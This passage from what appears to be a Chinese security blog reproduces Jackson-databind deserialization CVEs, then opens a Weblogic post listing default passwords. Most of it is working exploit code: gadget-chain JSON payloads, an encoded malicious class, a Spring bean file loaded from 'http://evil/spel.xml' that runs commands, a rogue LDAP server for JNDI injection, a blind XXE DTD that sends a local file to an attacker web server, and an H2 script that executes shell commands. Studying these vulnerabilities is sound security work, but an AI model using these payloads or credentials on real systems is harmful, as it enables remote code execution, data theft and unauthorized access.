\"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\" ], \"transletName\": \"a.b\", \"outputProperties\": &#123;&#125; &#125; ]&#125; 这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。 Jackson反序列化(CVE-2017-17485)针对CVE-2017-7525 黑名单修复 绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。 利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如 http://evil/spel.xml， 内容如下： 12345678910111213141516&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\"&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;touch&lt;/value&gt; &lt;value&gt;/tmp/prove2.txt&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=\"any\" value=\"#&#123; pb.start() &#125;\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 然后，发送如下数据包，使Jackson加载bean，触发漏洞： 12345678910111213141516POST /exploit HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 138&#123; \"param\": [ \"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://evil/spel.xml\" ]&#125; 成功执行touch /tmp/prove2.txt原理： 利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行 漏洞分析环境App.java 123456789101112131415161718192021222324252627import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;import java.lang.reflect.Array;/** * Created by liaoxinxi on 2017-12-11. */public class App &#123; public static void main(String args[])&#123; testSpringFramework(); &#125; public static void testSpringFramework()&#123; //CVE-2017-17485 // 假设这是攻击者可以控制的请求包payload String payload = \"[\\\"org.springframework.context.support.ClassPathXmlApplicationContext\\\", \" + \"\\\"http://127.0.0.1/spel.xml\\\"]\\n\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 开启web服务，并将如下的spel.xml文件放入根目录中 spel.xml 1234567891011&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot; http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt; &lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;any&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; Jackson-databind 反序列化 (CVE-2020-8840)这个CVE利用xbean-reflect利用链造成JNDI注入影响版本：2.0.0 - 2.9.10.2 pom.xml 1234567891011121314151617181920&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt; &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt; &lt;version&gt;4.16&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.unboundid&lt;/groupId&gt; &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 起一个web服务器，并将编译的Exploit.class放入根目录中 1python -m http.server 8080 Exploit.java 12345678910public class Exploit &#123; public Exploit()&#123; try &#123; Runtime.getRuntime().exec(\"calc\"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; marshalsec开启LDAP服务 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/#Exploit Poc 123456789101112131415import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Poc &#123; public static void main(String args[]) throws IOException &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"[\\\"org.apache.xbean.propertyeditor.JndiConverter\\\", &#123;\\\"asText\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;]\"; mapper.readValue(json, Object.class); &#125;&#125; CVE-2020-14060影响范围 jackson-databind before 2.9.10.4 jackson-databind before 2.8.11.6 jackson-databind before 2.7.9.7 利用条件 开启enableDefaultTyping() 使用了org.apache.drill.exec:drill-jdbc-all第三方依赖 pom.xml 123456789101112131415161718192021222324252627282930313233&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.drill.exec&lt;/groupId&gt; &lt;artifactId&gt;drill-jdbc-all&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.transaction&lt;/groupId&gt; &lt;artifactId&gt;jta&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.unboundid&lt;/groupId&gt; &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.aoju/bus-core --&gt; PS：这里的漏洞所使用的库包需要在1.4版本才可以，之后没有该漏洞类，而目前最新的已经是1.17.0了，所以总体来说较为鸡肋~ 启动web服务，并放入编译好的badClassName.class文件 badClassName.java 12345678import java.io.IOException;public class badClassName &#123; public badClassName() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; 启动LDAPServer 服务 LDAPServer.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;class LDAPServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8888/#badClassName\"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; POC: 1234567891011121314151617import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\\\",&#123;\\\"jndiPath\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\"&#125;]\"; try &#123; Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 之后运行该程序，成功执行命令，弹出计算器： CVE-2020-14062影响范围 jackson-databind before 2.9.10.4 jackson-databind before 2.8.11.6 jackson-databind before 2.7.9.7 利用条件 开启enableDefaultTyping() 使用了com.sun.xml.parsers:jaxp-ri第三方依赖 漏洞复现 pom.xml 12345678910111213141516171819202122232425262728293031&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.xml.parsers&lt;/groupId&gt; &lt;artifactId&gt;jaxp-ri&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.transaction&lt;/groupId&gt; &lt;artifactId&gt;jta&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.unboundid&lt;/groupId&gt; &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Poc.java 1234567891011121314151617import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\\\",&#123;\\\"jndiPath\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\"&#125;]\"; try &#123; Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; CVE-2020-14195影响范围 jackson-databind before 2.9.10.4 jackson-databind before 2.8.11.6 jackson-databind before 2.7.9.7 利用条件 开启enableDefaultTyping() 使用了org.jsecurity.realm.jndi.JndiRealmFactory第三方依赖 pom.xml 1234567891011121314151617181920212223242526272829303132&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.4&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.jsecurity/jsecurity --&gt; &lt;dependency&gt; &lt;groupId&gt;org.jsecurity&lt;/groupId&gt; &lt;artifactId&gt;jsecurity&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.transaction&lt;/groupId&gt; &lt;artifactId&gt;jta&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.unboundid&lt;/groupId&gt; &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 漏洞Poc: 12345678910111213141516import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"org.jsecurity.realm.jndi.JndiRealmFactory\\\",&#123;\\\"jndiNames\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\"&#125;]\"; try &#123; Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Jackson JDOM XSLTransformer Gadget影响范围 Jackson 2.x ~2.9.9 利用条件 开启enableDefaultTyping 使用了JDOM 1.x 或 JDOM 2.x 依赖 漏洞简介在Jackson 2.x ~ Jackson 2.9.9,当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法并且服务端使用了JDOM 1.x 或 JDOM 2.x 依赖库时，攻击者可以发送恶意的JSON消息，读取远程服务器上的任意文件。 创建一个Meaven项目，在pom.xml文件中添加以下依赖： 123456789101112131415161718192021222324252627&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.9.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.9&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.jdom/jdom2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.jdom&lt;/groupId&gt; &lt;artifactId&gt;jdom2&lt;/artifactId&gt; &lt;version&gt;2.0.6&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 编写poc.xml该XXE属于Blind XXE，我们构造以下恶意xml代码，它会去调用位于我们的攻击主机上(这里以本地启动的Http服务模拟)的外部dtd文件(不在同一个文件写入要读取的文件主要是为了避免参数实体引用时发生的错误）： 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE any[&lt;!ENTITY % file SYSTEM \"file:///g:/json.txt\"&gt;&lt;!ENTITY % remote SYSTEM \"http://127.0.0.1:4444/evil.dtd\"&gt;%remote;%send; ]&gt; &lt;foo&gt;&lt;/foo&gt; 编写evil.dtd 12&lt;!ENTITY % ppp \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1/%file;'&gt;\"&gt;%ppp; 起一个web服务，端口为4444，将以上两个xml文件放入其中。 1python -m http.server 4444 再起一个web服务，端口为80，接受盲打返回的信息 1python -m http.server 80 POC 123456789101112131415import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Poc &#123; public static void main(String[] args) &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"org.jdom2.transform.XSLTransformer\\\", \\\"http://127.0.0.1:4444/poc.xml\\\"]\"; try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 漏洞原理可看此文章：Jackson JDOM XSLTransformer Gadget浅析 jackson-databind RCE(CVE-2020-36186)影响范围 Jackson-databind &lt; 2.9.10.7 利用条件 开启enableDefaultTyping() 使用了commons-dbcp第三方依赖库 漏洞概述org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。 漏洞复现pom.xml如下： 12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.7&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/tomcat/naming-factory-dbcp --&gt; &lt;dependency&gt; &lt;groupId&gt;tomcat&lt;/groupId&gt; &lt;artifactId&gt;naming-factory-dbcp&lt;/artifactId&gt; &lt;version&gt;5.5.23&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.transaction&lt;/groupId&gt; &lt;artifactId&gt;jta&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 开启ldap服务 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:4444&#x2F;#Exploit 1389 Poc 123456789101112131415import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.SerializationFeature;public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); String json = \"[\\\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\\\", &#123;\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/Exploit\\\"&#125;]\"; Object obj = mapper.readValue(json, Object.class); mapper.writeValueAsString(obj); &#125;&#125; Jackson-databind SSRF&amp;RCE(CVE-2020-36189)影响范围 Jackson-databind &lt; 2.9.10.7 利用条件 开启enableDefaultTyping() 使用了com.h2database\\com.newrelic.agent.java第三方依赖库 漏洞概述com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成SSRF&amp;RCE。 漏洞复现pom.xml 12345678910111213141516171819202122232425262728293031&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.10.7&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.newrelic.agent.java/newrelic-agent --&gt; &lt;dependency&gt; &lt;groupId&gt;com.newrelic.agent.java&lt;/groupId&gt; &lt;artifactId&gt;newrelic-agent&lt;/artifactId&gt; &lt;version&gt;4.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;version&gt;1.4.199&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.transaction&lt;/groupId&gt; &lt;artifactId&gt;jta&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; SSRF POC 123456789101112131415import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.SerializationFeature;public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); String json = \"[\\\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\\\", &#123;\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://pxrrvz.dnslog.cn/'\\\"&#125;]\"; Object obj = mapper.readValue(json, Object.class); mapper.writeValueAsString(obj); &#125;&#125; RCE web服务放入 exec.sql文件exec.sql 12345CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; &#125;$$;CALL SHELLEXEC('calc.exe') poc 1234567891011public class Poc &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); String json = \"[\\\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\\\", &#123;\\\"url\\\":\\\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:4444/exec.sql'\\\"&#125;]\"; Object obj = mapper.readValue(json, Object.class); mapper.writeValueAsString(obj); &#125;&#125; Jackson-databind SSRF影响范围 jackson-databind before 2.9.10.3 jackson-databind before 2.10.2 利用条件 开启enableDefaultTyping() 漏洞概述漏洞类javax.swing.JEditorPane来源于JDK不需要依赖任何jar包，该类在jackson-databind进行反序列化时可造成SSRFJackson-databind SSRF浅析 官方新规2020年12月30号，Jackson-databind官方表明由于之前对于黑名单更新的补丁过于频繁而且有大量的绕过是的版本的更新迭代过于频繁，加上申请CVE的流程使得整个维护变得更加繁琐，所以决定从2020年12月31号发布最后一个2.9.10.8版本之后将不再对此黑名单进行维护(除非有极其严重的问题发生)，同时也不再给相关白帽子申请相关CVE编号，但是会继续接受有关Jackson-databind的黑名单类相关安全报告，更多细节可以参考以下连接： https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria 参考文章： https://vulhub.org/#/environments/jackson/CVE-2017-7525/https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/Jackson-databind的几个CVEJackson 反序列化汇总Jackson反序列化远程代码执行漏洞Jackson-databind的几个CVEJackson JDOM XSLTransformer Gadget浅析Jackson-databind漏洞两则分析Jackson-databind SSRF浅析 Jackson-databind 反序列化漏洞分析 (CVE-2020-8840): https://patrilic.top/2020/03/24/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(CVE-2020-8840)/#CVE-2020-8840","categories":[],"tags":[]},{"title":"Weblogic 漏洞学习","slug":"Weblogic-漏洞学习","date":"2021-03-31T15:11:56.000Z","updated":"2021-04-13T16:15:32.547Z","comments":true,"path":"article/db67dfce.html","link":"","permalink":"https://blog.cfyqy.com/article/db67dfce.html","excerpt":"WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。","text":"WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVA EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 基本信息默认端口：7001 、7002 常见默认口令： 1234567891011用户名：system 密码：password用户名：weblogic 密码：weblogic 用户名：admin 密码：security用户名：portadmin 密码：portadmin用户名：joe 密码：password用户名：mary 密码：password用户名：system 密码：security用户名：system 密码：system用户名：wlcsystem 密码：wlcsystem用户名：wlpisystem 密码：wlpisystem用户名：guest 密码：guest 常见的Weblogic版本 123456789101112131415161718192021222324WebLogic Server 14c(14.1.1.0.0)-2020年4月3日WebLogic Server 12c(12.1.1) - 2012年3月6日WebLogic Server 12c(12.0) - 2011年12月1日WebLogic Server 11gR1 PS5 (10.3.6) - 2012年2月23日WebLogic Server 11gR1 PS4 (10.3.5) - 2011年5月6日WebLogic Server 11gR1 PS3 (10.3.4) - 2011年1月15日WebLogic Server 11gR1 PS2 (10.3.3) - 2010年四月WebLogic Server 11gR1 PS1 (10.3.2) - 2009年11月WebLogic Server 11g (10.3.1) - 2009年7月WebLogic Server 10.3 - 2008年8月（J2EE6支持）WebLogic Server 10.0 - 2007年3月（J2EE5支持）WebLogic Server 9.2.4 - 2010年7月22（主要提升管理和运行管理的功能）WebLogic Server 9.1WebLogic Server 9.0 - 【Diablo】 2006年11月WebLogic Server 8.1 －2003年7月发行到2004年8月为成熟版本，也已不再支持WebLogic Server 7.0 －2002年6月发行但是BEA公司推荐放弃使用。WebLogic Server 6.1 - 从November 2006不再支持WebLogic Server 6.0 - 2001年3月,从April 2003不再支持WebLogic Server 5.1 - (代码名: Denali) 第一个支持热部署技术的版本(通过命令行)WebLogic Server 4.0 - 1999年WebLogic Tengah 3.1 - 1998年6月WebLogic Tengah 3.0.1 - 1998年3月WebLogic Tengah 3.0 - 1998年1月WebLogic Tengah - 1997年11月 